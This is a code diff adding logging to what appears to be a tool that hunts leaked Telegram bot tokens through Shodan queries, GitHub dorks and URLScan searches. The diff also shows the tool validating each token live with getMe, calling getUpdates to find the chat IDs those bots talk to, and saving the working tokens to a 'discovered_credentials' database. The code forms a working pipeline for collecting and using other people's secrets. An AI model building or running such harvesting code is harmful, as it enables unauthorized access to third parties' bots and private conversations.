@@ -7,6 +7,11 @@ from app.services.scanners import ShodanService, GithubService, UrlScanService
 from app.core.security import security
 from app.core.database import db
 import hashlib
+import logging
+
+# Configure Task Logger
+logger = logging.getLogger("scanner.tasks")
+logger.setLevel(logging.INFO)
 
 # Instantiate services (Fofa/Censys/HybridAnalysis REMOVED - API issues)
 shodan = ShodanService()
@@ -25,6 +30,8 @@ async def _save_credentials_async(results, source_name: str):
     from app.services.scanners import _is_valid_token
     
     saved_count = 0
+    logger.info(f"🔍 [Batch] Validating {len(results)} potential credentials from {source_name}...")
+
     for item in results:
         token = item.get("token")
         if not token or token == "MANUAL_REVIEW_REQUIRED":
@@ -32,7 +39,7 @@ async def _save_credentials_async(results, source_name: str):
         
         # Step 1: Validate token format (reject Fernet/hashes)
         if not _is_valid_token(token):
-            print(f"    [Validate] ❌ Invalid token format: {token[:20]}...")
+            logger.debug(f"    ❌ [Validate] Invalid format: {token[:15]}...")
             continue
         
         token_hash = _calculate_hash(token)
@@ -49,22 +56,23 @@ async def _save_credentials_async(results, source_name: str):
                 existing_id = existing.data[0]['id']
                 existing_has_chat = existing.data[0].get('chat_id') is not None
                 if existing_has_chat:
+                    logger.debug(f"    ⏭️ [Validate] Token {token[:10]}... already exists with chat_id.")
                     continue  # Skip - already has chat_id
-                print(f"    [Validate] Token exists but no chat_id, checking for updates...")
+                logger.info(f"    🔄 [Validate] Token exists (ID: {existing_id}) but missing chat_id. Checking for updates...")
             
             # Step 3: Validate token with Telegram getMe API (NO CHAT REQUIRED)
-            print(f"    [Validate] Testing token {token[:15]}... via Bot API")
+            # logger.debug(f"    [Validate] calling getMe for {token[:15]}...")
             
             base_url = f"https://api.telegram.org/bot{token}"
             me_res = requests.get(f"{base_url}/getMe", timeout=10)
             
             if me_res.status_code != 200 or not me_res.json().get('ok'):
-                print(f"    [Validate] ❌ Token invalid or revoked")
+                logger.debug(f"    ❌ [Validate] Token invalid or revoked (HTTP {me_res.status_code})")
                 continue
             
             bot_info = me_res.json().get('result', {})
             bot_username = bot_info.get('username', 'unknown')
-            print(f"    [Validate] ✅ Token valid! Bot: @{bot_username}")
+            logger.info(f"    ✅ [Validate] Token VALID! Bot: @{bot_username} (ID: {bot_info.get('id')})")
             
             # Step 4: Try to get a chat_id (Priority: Extracted -> API -> None)
             chat_id = extracted_chat_id
@@ -72,7 +80,7 @@ async def _save_credentials_async(results, source_name: str):
             chat_type = None
 
             if chat_id:
-                print(f"    [Validate] ✅ Using extracted chat_id: {chat_id}")
+                logger.info(f"    📍 [Validate] Using extracted chat_id: {chat_id}")
             else:
                 # Try to fetch via API if we didn't extract one
                 try:
@@ -88,9 +96,10 @@ async def _save_credentials_async(results, source_name: str):
                                     chat_type = chat.get('type')
                                     break
                             if chat_id:
+                                logger.info(f"    🕵️ [Validate] Discovered chat_id via getUpdates: {chat_name} ({chat_id})")
                                 break
-                except:
-                    pass
+                except Exception as e:
+                    logger.warning(f"    ⚠️ [Validate] getUpdates check failed: {e}")
             
             # Step 5: Save to DB (INSERT new or UPDATE existing if we have chat_id)
             
@@ -109,7 +118,7 @@ async def _save_credentials_async(results, source_name: str):
                     }
                 }
                 db.table("discovered_credentials").update(update_data).eq("id", existing_id).execute()
-                print(f"    [Validate] 🔄 UPDATED Credential ID: {existing_id} with chat_id!")
+                logger.info(f"    💾 [DB] UPDATED Credential ID: {existing_id} with new chat_id!")
                 
                 # Local instantiation for logging
                 from app.services.broadcaster_srv import BroadcasterService
@@ -123,7 +132,7 @@ async def _save_credentials_async(results, source_name: str):
                 saved_count += 1
             elif existing_id and not chat_id:
                 # Token exists, still no chat - skip
-                print(f"    [Validate] ⏭️ Token exists, still no chat_id found, skipping.")
+                pass
             else:
                 # INSERT new record
                 data = {
@@ -146,6 +155,7 @@ async def _save_credentials_async(results, source_name: str):
                 if res.data:
                     new_id = res.data[0]['id']
                     status_label = "✅ ACTIVE" if chat_id else "⏳ PENDING"
+                    logger.info(f"    💾 [DB] INSERTED New Credential: {new_id} ({status_label})")
                     
                     # Local instantiation for logging
                     from app.services.broadcaster_srv import BroadcasterService
@@ -159,8 +169,10 @@ async def _save_credentials_async(results, source_name: str):
                     saved_count += 1
                 
         except Exception as e:
-            print(f"    [Validate] Error: {e}")
+            logger.error(f"    ❌ [Validate] Error processing token: {str(e)}")
             pass
+    
+    logger.info(f"✅ [Batch] Finished. Saved/Updated {saved_count} credentials.")
     return saved_count
 
 def _save_credentials(results, source_name: str):
@@ -198,24 +210,31 @@ def scan_shodan(query: str = None, country_code: str = None):
     random.shuffle(queries)
     if len(queries) > 5:
         queries = queries[:5]
-        print(f"    [Shodan] Limiting to 5 random queries to prevent timeout.")
+        logger.info(f"    [Shodan] Limiting to 5 random queries to prevent timeout.")
 
     # Country Logic
     selected_country = country_code
     if country_code == "RANDOM":
         selected_country = random.choice(settings.TARGET_COUNTRIES)
-        print(f"    [Shodan] Randomly selected country: {selected_country}")
+        logger.info(f"    [Shodan] Randomly selected country: {selected_country}")
 
-    print(f"Starting Shodan scan with {len(queries)} queries (Country: {selected_country})...")
+    logger.info(f"🌎 [Shodan] Starting Scan | Queries: {len(queries)} | Country: {selected_country or 'Global'}")
     _send_log_sync(f"🌎 [Shodan] Starting scan with {len(queries)} queries (Country: {selected_country})...")
+    
+    total_saved = 0
+    errors = []
 
     for q in queries:
         try:
+            logger.info(f"    🔎 [Shodan] Executing query: {q}")
             results = shodan.search(q, country_code=selected_country)
+            logger.info(f"    ✅ [Shodan] Query returned {len(results)} raw results.")
+            
             saved = _save_credentials(results, "shodan")
             total_saved += saved
             time.sleep(1) # Rate limit respect
         except Exception as e:
+            logger.error(f"    ❌ [Shodan] Query failed: {str(e)}")
             errors.append(str(e))
             
     result_msg = f"Shodan scan finished. Saved {total_saved} new credentials."
@@ -223,6 +242,7 @@ def scan_shodan(query: str = None, country_code: str = None):
         result_msg += f" (Errors: {len(errors)})"
         _send_log_sync(f"❌ [Shodan] Completed with errors: {errors[0]}...")
 
+    logger.info(f"🏁 [Shodan] Finished | Total Saved: {total_saved} | Errors: {len(errors)}")
     _send_log_sync(f"🏁 [Shodan] Finished. Saved {total_saved} new credentials.")
     return result_msg
 
@@ -232,17 +252,22 @@ def scan_urlscan(query: str = "api.telegram.org", country_code: str = None):
     selected_country = country_code
     if country_code == "RANDOM":
         selected_country = random.choice(settings.TARGET_COUNTRIES)
-        print(f"    [URLScan] Randomly selected country: {selected_country}")
+        logger.info(f"    [URLScan] Randomly selected country: {selected_country}")
         
-    print(f"Starting URLScan scan: {query} (Country: {selected_country})")
+    logger.info(f"🔍 [URLScan] Starting Scan | Query: {query} | Country: {selected_country or 'Global'}")
     _send_log_sync(f"🔍 [URLScan] Starting scan with query: `{query}` (Country: {selected_country})")
     try:
         results = urlscan.search(query, country_code=selected_country)
+        logger.info(f"    ✅ [URLScan] Returned {len(results)} results.")
+        
         saved = _save_credentials(results, "urlscan")
         msg = f"URLScan scan finished. Saved {saved} new credentials."
+        
+        logger.info(f"🏁 [URLScan] Finished | Saved: {saved}")
         _send_log_sync(f"🏁 [URLScan] Finished. Saved {saved} new credentials.")
         return msg
     except Exception as e:
+        logger.error(f"❌ [URLScan] Failed: {e}")
         _send_log_sync(f"❌ [URLScan] Scan failed: {e}")
         return f"URLScan scan failed: {e}"
 
@@ -287,20 +312,28 @@ def scan_github(query: str = None):
     errors = []
 
     print(f"Starting GitHub scan with {len(queries)} queries...")
+    logger.info(f"🐱 [GitHub] Starting scan with {len(queries)} dorks...")
     _send_log_sync(f"🐱 [GitHub] Starting scan with {len(queries)} dorks (Selected from pool)...")
 
     for q in queries:
+        logger.info(f"    🔎 [GitHub] Dorking: {q}")
         print(f"Executing GitHub Dork: {q}")
         try:
             results = github.search(q)
+            logger.info(f"    ✅ [GitHub] Dork returned {len(results)} matches.")
+            
             saved = _save_credentials(results, "github")
             total_saved += saved
             print(f"  > Found {len(results)} matches, saved {saved} new.")
         except Exception as e:
+            logger.error(f"    ❌ [GitHub] Dork failed: {str(e)}")
             print(f"  > Error: {e}")
             errors.append(str(e))
         
             time.sleep(5) 
+            
+    if errors:
+         logger.warning(f"⚠️ [GitHub] Completed with {len(errors)} errors.") 
 
     result_msg = f"GitHub scan finished. Saved {total_saved} unique credentials."
     if errors:
